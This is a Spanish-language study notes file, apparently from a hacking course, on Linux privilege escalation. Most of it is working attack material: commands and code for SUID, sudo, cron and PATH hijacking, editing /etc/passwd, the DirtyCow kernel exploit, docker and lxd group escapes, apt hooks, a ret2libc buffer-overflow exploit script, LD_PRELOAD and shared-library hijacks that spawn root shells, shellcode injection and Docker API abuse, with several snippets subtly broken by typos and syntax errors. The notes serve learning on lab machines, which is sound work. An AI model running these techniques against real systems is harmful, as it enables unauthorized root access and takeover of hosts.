
-------
>Una vez he ganado acceso
-----
>
>Si python tiene SUID perms, ejecutamos

```bash
python3
import os
os.system("whoami")
os.system("bash")
```


- Cuándo he conseguido bash con gtfobins y no soy root probar con 
- Esto ejecutará una bash con los máximos privilegios
```bash
bash -p
```

## Abusando de sudoers
----
- Para listar que permisos tengo con el current user

- Ayudarnos de [GTFObins](https://gtfobins.github.io/)

```bash
sudo -l 
o 
sudo -l -l
```

- Tratamiento de la **tty** una vez entablada la reverse shell
```bash
script /dev/null -c bash
Ctrol + Z
stty raw -echo ; fg # llevr netcat a 2 plano
reset xterm # o el visor que utilices
stty size # ver size de nuestra terminal
export TERM=xterm
export SHELL=bash
stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
```

## Abusando de Privilegios SUID - Set User ID
----
>Buscaremos los archivos o binarios que tenga este permiso especial pare ejecutar como root este mismo binario encontrado y **tratar de leer archivos o alguna acción más intrusiva**, ten pensamiento lateral con ese comando


>Permiso chmod 4755 pertenece a suid

> Commands Para **SUID** para **SGID**
```bash
SUID
find / -perm -4000 -ls 2>/dev/null
SGID
find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
AMBOS
ls -alh /path/to/check | grep 's'
``` 

```
chmod 4775 binario
chmod u+s binario
-rwsr-xr-xr root root archivo --> SUID
```

>Curiosidad: **pkexec** se logró explotar y la vuln se lama pwnkit, si te lo encuentras haz un buen research de esto

## Detección y explotación de tareas Cron
---

> Intentar asignarnos permisos suid a un binario que nosotros queramos

>Ver que comando se  ejecuta  y que usuarios lo ejecutan

```bash
ps -eo command
ps -eo user,command
```

>Ver que tarea se ejecuta


```bash
systemctl list-timers
```
- [PSPY](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)
**¿Cómo paso el pspy a la máquina víctima?**

- Víctima: leo el archivo que publica la máquina atacante y lo meto en `pspy` para que sea un binario
```bash
nc -nlvp 443 > pspy
```
- Atacante Publico el archivo pspy
```bash
cat > /dev/tcp/192.168.1.135/443 < /usr/local/bin/pspy
nc 192.168.1.135 443 < /usr/local/bin/pspy
```


Script para **ver que comandos se ejecutan en tiempo real**, en el output al ejecutarlo tenemos lo siguiente

>**<**: Sirve para ver que comando ya no se está ejecutando
>**>**: Sirve para ver que comando se está ejecutando

- ***1ºer script***
```bash
#!/bin/bash

old_process=$(ps -eo user, command)

while true; do
	new_process=$(ps -eo user, command)
	diff <(echo "$old_process") <(echo "$new_process" ) | grep "[><]" | grep -vE "procmon| command|kworker"
	old_process=$new_proces
done
```

- ***2ºndo Script***
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm: exit 1 #Recuperar cursor
}

# Habilitar Ctrl+c
trap ctrl_c SIGINT

old_process=$(ps -eo user,command)

tput civis # Ocultar cursor

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker|procmon"
	old_process=$new_process
done
```

## PATH Hijacking

> Nos aprovechamos de un binario que está en el **$PATH** con la ruta relativa d eun comando que haya dentro como **system("whoami");** del Código en ***C***

- Instalamos el paquete **gcc** para hacer el binario en #C
- Hacemos este binario en C para abusar de él
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
        setuid(0); #Asignamos el usuario root para que ejecute lo siguiente
        printf("\n[+]Actualmente somos este user:\n\n");
        system("/usr/bin/whoami");
        printf("\n[+]Actualmente somos este user:\n\n");
        system("whoami");
        return 0;
}
```

- Damos permisos de escritura
```bash
gcc binario.c -o pedazobinario
./pedazobinario
```

- Nos aprovecharemos de los binarios de **$PATH**

>La prioridad va de izquierda a derecha y el binario está en /tmp, **NO ES /tmp**

```bash
echo $PATH
export PATH=/tmp/:$PATH
```

>Debemos ser capaces de alterar el PATH y crear un binario que dentro posea un comando con su ruta relativa

>Si hago un archivo que se llame whoami y le doy permisos de `x`, si el archivo tiene lo siguiente al ejecutar el binario **de arriba**, el sistema irá a buscar lo que vale whoami al directorio **/tmp** porque lo hemos exportado antes, y ese whoami valdrá lo siguiente dentro de **/tmp**

- Contenido de whoami
```bash
bash -p
```

## Python Hijacking

>Secuestraremos una librería que se utilice en un script del sistema en el que nos creamos un archivo **.py** con el nombre de la libreria para decirle qué queremos que valga esa librería, **en este caso hashlib**, (d eun archivo que tengamos permisos de r podemos crear un archivo con el mismo nombre, **en este caso no exportamos nada al PATH** porque la vuln viene del espacio en blanco del **path de python**, el cuál se refiere al directorio actual)

>En este caso si nos encontramos en **sudoers** una config como **usuario1 ALL toni:ALL python3 /tmp/elscriptquehayprimero.py**, podemos ejecutar: `sudo -u toni python3 /tmp/elscriptquehayprimero.py`
- Nos encontramos este script

```python
import hashlib

if __name__ == '__main__':

        cadena= "Ce face"

        print(hashlib.md5(cadena.encode()).hexdigest())

```
- Ejecuitamos el este comando y vemos el path de **librerías python**
```bash
python3 -c 'import sys: print(sys.path)'
```
- Vemos algo como , python hace como con el **PATH** tiene prioridad de izquierda a derecha
`['', 'libreria1.zip','libreria2']`

- `nano hashlib.py` con el nombre de la librería de dentro del archivo ya que python cree que **hashlib** vale lo siguiente, o directamente podemos pegarle esto **si tuviésemos permisos  de escritura en la libreria /usr/lib/python3/hashlib.py**
```python
import os

os.system("bash-p")
```

- Ganar acceso como el user que ejecuta este archivo
```bash
sudo -u toni python3 /tmp/elscriptquehayprimero.py
```

## Abuso de permisos incorrectamente implementados

>Podemos intentar editar el **/etc/passwd** ai tuviese permiso de **w**, le pondremos una passwd hardcodeada que nosotros queramosy el sistema leerá primero este fichero

`openssl passwd` --> nos saca hash
- Encontrar Archivos editables con el **current user**
```bash
find / -writeable 2>/dev/null | grep -vE "cadenaquenoqueremos|proc"
```
- **/etc/passwd**
`user:hash.:0:0:root:/root:/bin/bash`

- Ver qué ejecuta el crontab
`***** horas.sh`

>Si el script horas.sh está en el directorio perosnal de un usuario sin privilegios, aunque no tega permisos de ecición, se puede borrar y crear uno nuevo que nosotros queramos jiji 😁

- En directorio personal del user, como **la tarea la ejecuta root desde crontab**, pues zas zas
```bash
rm -rf hola.sh
nano hola.sh
#!/bin/bash

chmod u+s /bin/bash
```

- Ejecutables para abusar de tu madre, digo de permisos suculentos

1. [LSE](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
O
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh

./lse -l 1
```

2. [LinPEAS](https://github.com/Keartland/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) Leer su github que bypassea ANtiVirus
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

## Detección y explotación de Capabilities

>En sistemas unix, las capabilities son funcio nalidades que permiten al usuario ejecutar acciones privilegiadas sin necesidad de ser superuser

>**Permisos permitidos (permitted capabilities)**: son los permisos que un proceso tiene permitidos. Esto incluye tanto permisos efectivos como heredados. Un proceso solo puede ejecutar acciones para las que tiene permisos permitidos.
 
>**Permisos heredados (inheritable capabilities)**: son los permisos que se heredan por los procesos hijos que son creados. Estos permisos pueden ser adicionales a los permisos efectivos que ya posee el proceso padre.

>**Permisos efectivos (effective capabilities)**: son los permisos que se aplican directamente al proceso que los posee. Estos permisos determinan las acciones que el proceso puede realizar

- El recurso **/proc/pid_process/status** arroja info y podemos ver capabilities 

```bahs
toni@24c05775669f:/home$ cat /proc/1/status | grep -Fi "cap"
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

toni@24c05775669f:/home$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

- Ver dónde se ejecuta el process
```bash
toni@24c05775669f:/home$ pwdx 416
416: /home
```

- Asignar capabilities, **ep** indica que tiene el permiso de ejecución elevado
```bash
setcap cap_setuid+ep /usr/bin/python3.10
```

> Commands para ver capabilities
> Podemos ver ciertas tareas privilegiadas con el user actual

```bash
getcap -r / 2>/dev/null
```

- En el caso de python
```bash
python3.10 -c 'import os; os.setuid(0); os.system("bash)'
```

## Explotación del Kernel

>Para versiones antiguas  como kernel **3.\***

- Enumeramos el Kernel
```bash
lsb_release -a
uname -a
cat /etc/os-release
searchsploit  S.O

searchsploit kernel 3.20

searchsploit -m ruta

mv exploiten.c dirtycow.c

#en el exploit suelen poner como compilarlo

cat dirtycow.c | grep gcc

gcc -pthread dirty.c -o dirtycow -lcrypt

./dirtycow

#Crea un usuario en el /etc/passwd con permisos de root
#Esperamos un rato y ejecutamos el siguiente comando para comprobrarlo

cat /etc/passwd
su usuarionuevo
id
```

- Con esta herramienta vemos potenciales exploits a ejecutar contra el kernel  [LES.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)

## Abuso de grupos de usuario especiales

>Si hay un user que pertenece a grupos que ejecuten acciones privilegiadas, intentaremos bypassearlo

- Imaginemos que es **docker**, montamos el directorio personal de **/mnt/root** en la raíz de la máquina comprometida , ya vimos que esta montura hacía un enlace simbólico.

```bash
docker run -dit -v /:/mnt/root --name privesc ubuntu
docker exec -it privesc bash

ls /mnt/root

chmod u+s bash
exit
ls -la /bin/bash

bash -p
```

- Grupo **adm** que **permite administrar los logs web**

>Podemos dejar archivos php cpn una cmd , ataque de shellshock o log poisoning


```bash
sudo service apache2 start
```

- Ahora veremos el grupo **lxd**

```bash

searchsploit lxd

searchsploit -m ruta

copiar la instrucción de alpine que nos dice dentro del exploit

bash build-alpine

#Genera un .gz y se lo tenemos que pasar al contenedor

./archivodescargado -f .gz

#Esperamos a ganar acceso

#Observamos en /mnt a ver is hay monturas

chmod u+s /bin/bash
exit
bash -p
```

## Abuso de servicios internos del sistema

>Podemos ver una vez hemos ganado acceso más servicios internos que desde fuera, algunos corren de **forma privilegiada**

- Una vez ganamos acceso
```bash
netstat -nat
netstat -putan
```

- Desde la url vemos un **cmd.php**, abrimos otro puerto y puede ser que ese archivo que lo ejecute como root, o incluso podemos borrar ese archivo y crea runo con el mismo nombre qu enos de una cmd, **pero gracias a crontab lo ejecute root**
```URL
https://192.168.1.51/cmd.ph?cmd=curl https:192.168.1.51:8000/cmd.php?=whoami
```

- Podemos editar un fichero **01aaaaa** en la ruta **/etc/apt/apt.conf.d** fichero  y antes de que ejecute el update que haga lo siguiente [Web donde cogí el texto a escribir en 01aaaaaa](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)
```bash
nano 01aaaaaa

APT::Update::Pre-Invoke {"chmod u+s /bin/bash"; };
```

## Abuso de binarios específicos
---
Iremos resolviendo la máquina mientras desglosamos el topic

------

- Resolución de la máquina
>encontramos clave privada en un archivo clapriv3

`ssh user@192.168.11.15 -i clapriv3`

>Miro en gtfobins lo que tiene para **vi**

```vi
:set shell=/bin/bash
:shell
```
- Tiramos de **exim** que es un agente de **transporte de correo utilizado por unix sobretodo**
```bash
find -perm -4000 -ls 2>/dev/null
#Vemos exim 4.84-3
searchexploit exim 4.84-3
searchexploit -m archivo
mv archivo archivo.sh

chmod +x archivo.sh
./archivo.sh

#Esperamos a que nos de la shell
bash
```

### Abusando de binarios con buffer overflow

- Install **gdb y peda**, para debugear y darle color
- Vamos a debugear el binario [custom]([https://hack4u.io/wp-content/uploads/2023/04/custom](https://hack4u.io/wp-content/uploads/2023/04/custom)) en la máquina víctima
- Meter el siguiente código para trabajar más cómodos con esta doble implementación
```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

>El programa custom espera un número de bytes, pero le metemos más
>Imaginemos que las **A** por las que se multiplican sean verdad

>Es el  binario que hay en la víctima y vamos a desbordarlo
`custom A*1000`

- Debugeo el binario

>**EIP - (Extended Instruction Pointer):** apunta a la siguiente dirección de memoria  que el programa tiene que ejecutar, coge **4 bytes**
```bash
gdb /usr/bin/custom -q
#Dentro del debugger
r AAAAAAAAAA

r A*100000000

# Revienta y nos fijamos en la salida, en este caso en EIP
EIP: 0x41414141 ('AAAA') --> aquí enchufamos lo malicioso
```

- ¿Cuántas A le tenemos que meter hasta que llegue al EIP?
```bash
# dentro del binario con  gbd-peda
pattern create 300
# Nos da uina cadena aleatoria de 300 bytes a ver cuál es el límite
r cadenaaleatoriadePattern
EIP: 0x41414141 ('AA8A')

#Fuera de peda
echo 'cadenaaleatoriadePattern' | grep AA8A

#o hacerlo de esta manera en gbd-peda

pattern offset $eip
# después de ese output ahí inyectamos, simplemente para asegurar lo que inyectamos
python3 -c 'print("A"*112 + "B"*4)'

r salidaquenosdepython
EIP: 0x43434343 ('BBBB')
```

- Observar **protecciones**
```bash
checksex
#NX está habilitado e impide la ejecución con No Execution NX
```

- **ASLR - (Address Space Layout Randomization)** está habilitado, por lo que el binario se ejecuta en distintas posiciones de memoria , pero al ser de 32 bits no hay tantas posiciones y en un momento dado dónde nosotros apuntamos con nuestra inyección maliciosa coincidirá
```bash
# ldd nos dice las librerías compartidas que se llaman en el binario

ldd /usr/bin/custom
salía libc en el output

for i in $(seq 1 10000); do ldd /usr/bin/custom | grep libc | awk 'NF{print $NF}' | tr -d '( )' ; done | grep "0xb75bb000"
#Nos aprovecharemos de --> ret2libc
```

- Le queremos colar las instrucciones **system, exit y /bin/sh**
```bash
#Dentro de gdb-peda, consultamos las posiciones de memoria de esas instrucciones

p system

p exit

find "/bin/sh"

exit

# Vemos que direcciones hay y cogemos una jijijiji

for i in $(seq 1 10000); do ldd /usr/bin/custom | grep libc | awk 'NF{print $NF}' | tr -d '( )' ; done 

# el output es una dirección aleatoria
```

- Script en python para **calcular la distancia de las instrucciones que queremos inyectar**

```bash
sudo apt install binutils -y
ldd /usr/bin/custom

# el output es el path de de la librería libc
readelf -s outputLibreria | grep -E " system| exit"
# Nos da las posiciones en memoria de esas dos instrucciones y las ponemos en el script
strings -a -t x outputLibreria | grep "/bin/sh"

```

- Script para ganar shell aprovechándonos de un Btue force a una de las posiciones de memoria de ASLR

```python
#!/usr/bin/python3

import sys
import subprocess
from struct import pack


#EL offset ya lo sabemos
offset = 112
#Antes de llegar a la inyección representamos en formato b de bytes la cadena
before_eip = b"A"*112

#ret2libc -> system + exit + bin_sh

#a estos valores le sumamos nuestra dirección base de libc

base_libc_addr = direcciondeLDD/usr/bin/custom

#En este punto ya sabemos las posiciones de memoria de system, exit y /bin/sh con readelf 

system_addr_real = pack("<L", base_libc_addr + memoriaRealconreadelf) # <L empaqueta un entero sin signo
exit_addr_real = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_real = pack("<L", base_libc_addr + bin_sh_off)

payload = before_eip + system_addr_real + exit_addr_real + bin_sh_real

# Momento de bruteforce por ASLR, hasta alcanzar el punto de memoria de base_libc_addr

while True:
		result = subprocess.run(["sudo", "/usr/bin/custom", payload])
		if result.returncode == 0:
			print("\n\n[+] Estás saliendo de la shell que habías ganado  primazo\n)
			sys.exit(0)
```

- Script para ganar shell **sin ASLR**

```python
#!/usr/bin/python3

import sys
import subprocess
from struct import pack


#EL offset ya lo sabemos
offset = 112
#Antes de llegar a la inyección representamos en formato b de bytes la cadena
before_eip = b"A"*112

#ret2libc -> system + exit + bin_sh

#En este punto ya sabemos las posiciones de memoria de system, exit y /bin/sh con readelf 

system_addr_real = pack("<L", readelfsalidalivbreriaSystem) # <L empaqueta un entero sin signo - int unsigned datatype
exit_addr_real = pack("<L",readelfsalidalivbreriaExit)
bin_sh_real = pack("<L", stringslibreria/bin/sh)

payload = before_eip + system_addr_real + exit_addr_real + bin_sh_real

# Momento de ejecución

result = subprocess.run(["sudo", "/usr/bin/custom", payload])
	if result.returncode == 0:
		print("\n\n[+] Estás saliendo de la shell que habías ganado  primazo\n)
		sys.exit(0)
```

## Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente

>Las bibliotecas son archivos que utiilizan funciones y recursos utilizados por múltiples programas

>Básicamente crearemos un archivo maliciioso que tendrá el mismo nombre que la biiblioteca que busca el programa y en la ruta que el programa busca

- Script en **C** que genera un nº Random
```C
#Archivo random.c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]) {
	srand(time(NULL));
	printf("%d\n", rand());
}
```

- Instalamos esta [tool](https://github.com/namhyung/uftrace.git) para observar los binarios
```bash
root@24c05775669f:/repos/uftrace# uftrace --force -a /tmp/random
1553808921
# DURATION     TID      FUNCTION
   0.902 us [   6241] | time();
   0.711 us [   6241] | srand();
   0.185 us [   6241] | rand();
  59.757 us [   6241] | printf("%d\n") = 11;
```

- El random debe de coincidir con la firma que lleva nombre, argumento y tipo de retorno
`int rand(void);` --> void es argumento 

- Lel enlazador dinámico toma como prioritario la variable de entorno **LD_PRELOAD**, no se pueden robar funciones de bibliotecas estáticas porque las funciones están incrustadas en ese ejecutable dónde se encuentran
```C
# Archivo test
int rand(void){
  return 42;
}
```

- Si ejecuto lo siguiente, pillará el primer script, me devuelve **42**, secuestrándolo desde la variable preload (Aquí podriamos meterle una shell envez de un **42** hombre)
```bash
gcc test.c -o test
LD_PRELOAD=./test ./random
```

- Miramos dónde consultan los binarios las bibliotecas de forma dinámica, en **/usr/local/lib**

```bash

root@24c05775669f:/tmp# cat /etc/ld.so.conf.d/libc.conf 
/usr/local/lib

 ldd random
        linux-vdso.so.1 (0x00007f7c27469000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7c27248000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7c2746b000)
```
- Creo y compilo este script en C
```C
#archivo test.c
#include <stdio.h>
#include <unistd.h>

int random(){
  setuid(0);
  setgid(0);
  system("bash -p");
  return 0;
}
```

- Creo /lib si no existiese o modifico su nombre y compilo el binario, metiéndolo en /lib
```bash
gcc -fPIC -shared test.c -o librandom.so

mkdir lib
mv random.so lib
random # ejecutamos el binario que estaba en el sistema el cuál es vulnerbale

```

>**fPIC** sirevpara generar el códigoPosition Independient Code y sirve para que las biibliotecas se carguen en memoria desde cualquie rosición

>**shared**: especifica que el resultado de la compilación debe de ser una biblioteca compartida

## Docker Breakout

>Si  el user está dentro del grupo docker 

`/var/run/docker.sock` --> me permite comunicarme con sockets de docker

- Hago un pull de un docker ubuntu

```bash
docker pull ubuntu:latest
docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name privesc ubuntu

#Nos metemos al docker
docker exec -it privesc bash
apt update -y
apt install docker.io
#La raíz de esta montura se refiere a la máquina real, nos creamos otro
docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
cd /mnt/root/bin
chmod u+s bash
exit
#Máquina real
bash -p
```

### Despliegue de contenedores con compartición de procesos

- Desplegamos el contenedor asociando la lista de procesos de la máquina real al contenedor
```bash
docker run --rm -dit -v --pid=host --name privesc ubuntu
ps -faux 
```

> **Googleamos:** linux 64 bytes bind shell shellcode exploit db



- compilamos e intentamos abusar de un **python3 -m http.server porque s eejecuta de manera privilegiada**, así que listamos los procesos
- Instalamos  libcap2-bin para listar capabilities
```bash
./inject pid
```

- Vemos que capabilities le falta
```bash
capsh --print | grep "capabilitie que faltya después de ejecutar el binario"
exit
# Fuera del docker, le añadimos que queremos asignar la capabilitie que nos da después de jecutar el binario
docker run --rm -dit -v --pid=host --cap-add=SYS_PTRACE --name privesc ubuntu

#Para asignar todas las capabilities
docker run --rm -dit -v --pid=host --privileged --name privesc ubuntu
```

- el binario inyecta un shellcode en una posición de memoria y abre el puerto 5600 de la máquina real (acuérdate que hemos conectado los procesos de la real al container)
- Cogemos el shellcode  de los valores en hexadecimal [shellcode](https://www.exploit-db.com/exploits/41128)
- De aquí cogemos el **script en C** [injetc0x00sec_code](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)
-  En máquina **víctima**
```bash
apt update -y
apt install gcc netcat net-tools
gcc inject.c -o inject
chmod +x inject
ps -faux
./inject pid
nc 172.17.0.2 5600
script /dev/null -c bash 
Ctrl + Z
stty raw -echo; fg
reset xterm
stty rows lasrowsdenuestraterminal columns columnasdenuestraterm
export TERM=xterm
```

### Portainer gestor web de dockers

> aprovechando monturas podremos escapar del contenedor mediante archivos privilegiados

>Vamos a container --> add container 

- Image: ubuntulatest
- Nombre: privesc
- Console: Interactive & TTY
- Container: /mnt/root --> bind
- Host: /
- Deploy container
- Console: /bin/bash

>Dentro del contenedor, como hemos hecho monturas ese directorio está en la máquina real

### API docker puerto 2375 y 2376

> Si es http por el 2375 por https 2376

- Si detectamos un servicio por este puerto en un target dentro del contenedor

>Detectar si este puerto está abierto

```bash
echo '' > /dev/tcp/ipcontenedor/2375
echo $?
# si el código de stado es exitoso = 0 o no hay ningún output en el 1º comando es que está abierto
```

- Dentro del container cogemos el 1º curl de debajo de **/etc/shadow**
```
apt install curl jq -y
curl  -X POST -H "Content-Type: application/json" http://ipdocker:2375/containers/create?name=test -d '{"Image":"ubuntu:latest", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

>Nos da un id y nos lo guardamos

- Vemos los contenedores y las imagenes
```bash
curl http://ipdocker:2375/containers | jq
curl http://ipdocker:2375/images | jq
```
- Creamos contenedor
```bash
curl -X POST -H "Content-Type: application/json" http://ipdocker:2375/containers/idquenoshadado/
```

- Ejecutamos comandos
```bash
curl -X POST -H "Content-Type: application/json" http://ipdocker:2375/containers/idquenoshadado/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]}'

curl -X POST -H "Content-Type: application/json" http://ipdocker:2375/containers/idquenoshadado/start -d '{}'
```

- Desde fuera del contenedor
```bash
ls -l /bin/bash
bash -p
```